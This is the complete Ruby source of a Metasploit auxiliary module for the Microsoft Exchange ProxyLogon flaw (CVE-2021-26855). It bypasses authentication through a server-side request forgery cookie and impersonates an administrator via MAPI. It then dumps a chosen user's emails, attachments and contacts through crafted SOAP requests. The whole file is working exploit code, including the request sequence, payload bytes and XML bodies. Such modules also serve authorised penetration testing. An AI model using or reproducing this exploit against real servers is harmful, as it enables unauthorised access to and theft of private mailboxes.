##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# begin auxiliary class
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon Collector',
        'Description' => %q{
          This module exploit a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication and impersonating as the
          admin (CVE-2021-26855).

          By taking advantage of this vulnerability, it is possible to dump all
          mailboxes (emails, attachments, contacts, ...).

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'http://aka.ms/exchangevulns'],
          ['URL', 'https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/distinguishedfolderid']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Actions' => [
          ['Dump (Contacts)', {
            'Description' => 'Dump user contacts from exchange server',
            'id_attribute' => 'contacts'
          }],
          ['Dump (Emails)', {
            'Description' => 'Dump user emails from exchange server'
          }]
        ],
        'DefaultAction' => 'Dump (Emails)',
        'Notes' => {
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptBool.new('ATTACHMENTS', [true, 'Dump documents attached to an email', true]),
      OptString.new('EMAIL', [true, 'The email account what you want dump']),
      OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]),
      OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted'])
    ])

    register_advanced_options([
      OptInt.new('MaxEntries', [false, 'Override the maximum number of object to dump', 2147483647])
    ])
  end

  XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze

  def dump_contacts(server_name)
    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"

    response = send_xml(soap_countitems(action['id_attribute']), ssrf)
    if response.body =~ /Success/
      print_status(" * successfuly connected to: #{action['id_attribute']}")
      xml = Nokogiri::XML.parse(response.body)

      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS).values[0]
      print_status(" * selected folder: #{action['id_attribute']} (#{folder_id})")

      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS).content
      print_status(" * number of contact found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning(" * number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end

      response = send_xml(soap_listitems(action['id_attribute'], total_count), ssrf)
      xml = Nokogiri::XML.parse(response.body)

      print_status(message("Processing dump of #{total_count} items"))
      data = xml.xpath('//t:Items/t:Contact', XMLNS)
      if data.empty?
        print_status(' * the user has no contacts')
      else
        write_loot("#{datastore['EMAIL']}_#{action['id_attribute']}", data.to_s)
      end
    end
  end

  def dump_emails(server_name)
    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"

    response = send_xml(soap_countitems(datastore['FOLDER']), ssrf)
    if response.body =~ /Success/
      print_status(" * successfuly connected to: #{datastore['FOLDER']}")
      xml = Nokogiri::XML.parse(response.body)

      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS).values[0]
      print_status(" * selected folder: #{datastore['FOLDER']} (#{folder_id})")

      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS).content
      print_status(" * number of email found: #{total_count}")

      if total_count.to_i > datastore['MaxEntries']
        print_warning(" * number of email recalculated due to max entries: #{datastore['MaxEntries']}")
        total_count = datastore['MaxEntries'].to_s
      end

      print_status(message("Processing dump of #{total_count} items"))
      download_items(total_count, ssrf)
    end
  end

  def download_attachments(item_id, ssrf)
    response = send_xml(soap_listattachments(item_id), ssrf)
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath("//t:Message/t:Attachments/t:FileAttachment", XMLNS).each do|item|
      item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]

      response = send_xml(soap_downattachment(item_id), ssrf)
      data = Nokogiri::XML.parse(response.body)

      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS).content
      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS).content
      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS).content

      print_status("   -> attachment: #{item_id} (#{filename})")
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(content), filename, ctype)
    end
  end

  def download_items(total_count, ssrf)
    response = send_xml(soap_listitems(datastore['FOLDER'], total_count), ssrf)
    xml = Nokogiri::XML.parse(response.body)

    xml.xpath("//t:Items/t:Message", XMLNS).each do|item|
      item_info = item.at_xpath("./t:ItemId", XMLNS).values
      print_status(" * download item: #{item_info[1]}")

      response = send_xml(soap_downitem(item_info[0], item_info[1]), ssrf)
      data = Nokogiri::XML.parse(response.body)

      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS).content
      write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(email))

      attachments = item.at_xpath('./t:HasAttachments', XMLNS).content
      if datastore['ATTACHMENTS'] && attachments == 'true'
        download_attachments(item_info[0], ssrf)
      end
      print_status
    end
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def request_autodiscover(server_name)
    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }

    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522")
    xml = Nokogiri::XML.parse(response.body)

    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
    fail_with(Failure::Unknown, 'The \'LegacyDN\' value could not be found') if legacy_dn.empty?

    server = ''
    owa_urls = []
    xml.xpath("//xmlns:Account/xmlns:Protocol", xmlns).each do|item|
      type = item.at_xpath('./xmlns:Type', xmlns).content
      if type == 'EXCH'
        server = item.at_xpath("./xmlns:Server", xmlns).content
      end

      if type == 'WEB'
        item.xpath("./xmlns:Internal/xmlns:OWAUrl", xmlns).each do|owa_url|
          owa_urls << owa_url.content
        end
      end
    end
    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') unless owa_urls.length > 0

    return([server, legacy_dn, owa_urls])
  end

  def request_mapi(server_name, legacy_dn, server_id)
    mapi_data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    sid = ''
    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
    if response.code == 200 && response.body =~ /act as owner of a UserMailbox/
      sid_regex = /S-[0-9]{1}-[0-9]{1}-[0-9]{2}-[0-9]{10}-[0-9]{9}-[0-9]{10}-[0-9]{3,4}/
      sid = response.body.match(sid_regex)
    end
    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.to_s.empty?

    sid
  end

  def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded')
    request = {
      'method' => method,
      'uri' => @random_uri,
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => ctype
    }
    request = request.merge({'data' => data}) unless data.empty?

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def send_mapi(data, ssrf)
    request = {
      'method' => 'POST',
      'uri' => @random_uri,
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => 'application/mapi-http',
      'headers' => {
        'X-Requesttype' => 'Connect',
        'X-Requestid' => "#{Rex::Text.rand_text_numeric(12..13)}",
        'X-Clientapplication' => 'Outlook/15.0.4815.1002'
      },
      'data' => data
    }

    received = send_request_cgi(request)
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def send_xml(data, ssrf)
    received = send_request_cgi(
      'method' => 'POST',
      'uri' => @random_uri,
      'cookie' => "X-BEResource=#{ssrf};",
      'ctype' => 'text/xml; charset=utf-8',
      'data' => data
    )
    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_autodiscover
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
      </Autodiscover>
    SOAP
  end

  def soap_countitems(folder_id)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetFolder>
            <m:FolderShape>
              <t:BaseShape>Default</t:BaseShape>
            </m:FolderShape>
            <m:FolderIds>
              <t:DistinguishedFolderId Id="#{folder_id}">
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:FolderIds>
          </m:GetFolder>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listattachments(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:AdditionalProperties>
                <t:FieldURI FieldURI="item:Attachments" />
              </t:AdditionalProperties>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{item_id}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_listitems(folder_id, max_entries)
    <<~SOAP
      <?xml version='1.0' encoding='utf-8'?>
      <soap:Envelope
      xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
      xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
      xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
      xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
        <soap:Body>
          <m:FindItem Traversal='Shallow'>
            <m:ItemShape>
              <t:BaseShape>AllProperties</t:BaseShape>
            </m:ItemShape>
            <m:IndexedPageItemView MaxEntriesReturned="#{max_entries}" Offset="0" BasePoint="Beginning" />
            <m:ParentFolderIds>
              <t:DistinguishedFolderId Id='#{folder_id}'>
                <t:Mailbox>
                  <t:EmailAddress>#{datastore['EMAIL']}</t:EmailAddress>
                </t:Mailbox>
              </t:DistinguishedFolderId>
            </m:ParentFolderIds>
          </m:FindItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downattachment(item_id)
    <<~SOAP
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetAttachment>
            <m:AttachmentIds>
              <t:AttachmentId Id="#{item_id}" />
            </m:AttachmentIds>
          </m:GetAttachment>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def soap_downitem(id, change_key)
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <m:GetItem>
            <m:ItemShape>
              <t:BaseShape>IdOnly</t:BaseShape>
              <t:IncludeMimeContent>true</t:IncludeMimeContent>
            </m:ItemShape>
            <m:ItemIds>
              <t:ItemId Id="#{id}" ChangeKey="#{change_key}" />
            </m:ItemIds>
          </m:GetItem>
        </soap:Body>
      </soap:Envelope>
    SOAP
  end

  def write_loot(type, data, name = '', ctype = 'text/plain')
    loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '')
    print_good(" * file saved to #{loot_path}")
  end

  def run
    @proto = (ssl ? 'https' : 'http')
    @random_uri = normalize_uri('ecp', "#{Rex::Text.rand_text_alpha(1..3)}.js")

    print_status(message('Attempt to exploit for CVE-2021-26855'))

    # request for internal server name.
    response = send_http(datastore['METHOD'], 'localhost~1942062522')
    if response.code != 500 || response.headers['X-FEServer'].empty?
      print_bad('Could\'t get the \'X-FEServer\' from the headers response.')

      return
    end
    server_name = response.headers['X-FEServer']
    print_status(" * internal server name (#{server_name})")

    # get informations by autodiscover request.
    print_status(message('Sending autodiscover request'))
    discover_info = request_autodiscover(server_name)
    server_id = discover_info[0]
    legacy_dn = discover_info[1]

    print_status(" * Server: #{server_id}")
    print_status(" * LegacyDN: #{legacy_dn}")

    # get the user UID using mapi request.
    print_status(message('Sending mapi request'))
    sid = request_mapi(server_name, legacy_dn, server_id)
    print_status(" * sid: #{sid} (#{datastore['EMAIL']})")

    # selecting target
    print_status(message('Selecting the first internal server found'))
    if datastore['TARGET'].nil?
      target = ''
      discover_info[2].each do |url|
        host = url.split('://')[1].split('.')[0].downcase
        if host != server_name.downcase
          target = host

          break
        end
      end
      fail_with(Failure::Unknown, 'No internal target was found') if target.empty?

      print_status(" * targeting internal: #{target}")
    else
      target = datastore['TARGET']
      print_status(" * targeting internal forced to: #{target}")
    end

    # run action
    case action.name
    when /Dump \(Contacts\)/
      print_status(message("Attempt to dump contacts for <#{datastore['EMAIL']}>"))
      dump_contacts(target)
    when /Dump \(Emails\)/
      print_status(message("Attempt to dump emails for <#{datastore['EMAIL']}>"))
      dump_emails(target)
    end
  end

end
